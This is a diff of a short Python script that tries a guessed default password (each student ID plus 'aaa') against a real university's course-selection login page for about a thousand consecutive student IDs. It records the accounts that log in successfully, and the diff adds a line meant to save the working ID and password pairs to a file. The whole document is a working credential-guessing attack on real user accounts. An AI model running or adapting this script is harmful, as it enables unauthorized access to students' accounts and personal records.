@@ -1,15 +1,16 @@
 
 import base64, requests, re
-
 fo = open("list.txt", "wb+")
+
 cnt = 0
 for i in range(2015201101, 2015202131):
     s = requests.session()
     url = 'http://edusys.hrbeu.edu.cn/jsxsd/xk/LoginToXk'
-    zh = str(i).encode(encoding="utf-8")
+    # zh = str(i).encode(encoding="utf-8")
+    zh = bytes(str(i), encoding='utf8')
     psw = str(str(i) + 'aaa').encode(encoding="utf-8")
     arg = base64.b64encode(zh) + str('%%%').encode(encoding="utf-8") + base64.b64encode(psw)
-    arg = arg.decode()
+    arg = arg.decode(encoding='utf-8')
     #print(arg, type(arg))
     data = {
         'encoded': arg
@@ -21,5 +22,7 @@ for i in range(2015201101, 2015202131):
     #print(fi)
     if fi is None:
         cnt = cnt + 1
+        fo.write(zh, psw)
 
 print(cnt)
+fo.close()
